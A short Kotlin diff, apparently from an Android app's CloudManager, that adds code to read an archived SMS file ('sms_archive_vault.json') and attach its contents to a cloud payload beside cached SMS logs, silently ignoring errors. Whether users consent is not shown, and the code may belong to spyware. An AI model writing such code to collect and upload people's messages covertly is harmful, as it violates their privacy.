@@ -54,6 +54,15 @@ object CloudManager {
                     } else {
                         // PASSIVE: Send cached logs
                         json.put("sms_logs", JSONArray(prefs.getString("sms_logs_cache", "[]")))
+                        
+                        // Check for Vaulted Inbox
+                        val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
+                        if (vaultFile.exists()) {
+                            try {
+                                val vaultData = vaultFile.readText()
+                                json.put("historical_sms", JSONArray(vaultData))
+                            } catch(e: Exception) {}
+                        }
                     }
                     json.put("sms_count", prefs.getInt("sms_count", 0))
                 }
